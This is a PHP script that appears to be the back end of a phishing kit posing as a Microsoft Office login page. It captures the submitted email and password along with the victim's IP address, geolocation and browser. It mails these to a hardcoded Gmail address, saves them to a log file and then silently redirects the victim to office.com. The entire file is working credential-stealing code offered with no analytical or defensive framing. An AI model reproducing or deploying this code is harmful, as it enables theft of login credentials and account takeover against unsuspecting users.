<?php
$login = $_REQUEST['login'];
$passwd = $_REQUEST['passwd'];

require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "=============+ LOGS +=============\n";
$message .= "Em: ".$_POST['login']."\n";
$message .= "Pass: ".$_POST['passwd']."\n";
$message .= "Link: $_SERVER[HTTP_HOST]\n";
$message .= "============= [ Loc Info ] =============\n";
$message .= 	"IP: {$geoplugin->ip}\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= 	"User-Agent: ".$browser."\n";
$message.= "Date Log  : ".$date."\n";
$message.= "Time Log  : ".$time."\n";


$domain = 'Office';
$subj = "Login | $geoplugin->ip | $geoplugin->countryCode | $geoplugin->countryName";
$from = "From: $domain<west>\n";
mail("jmanlogs1010@gmail.com",$subj,$message,$from,$domain);

file_put_contents('../livessss.txt', $message, FILE_APPEND);
?>
<html>
 <script type="text/javascript">
         <!--
            function Redirect() {
               window.parent.window.location.href="https://www.office.com/?auth=2&home=1";
            }
            
            
            setTimeout('Redirect()', 0000);
         //-->
      </script>
	  </html>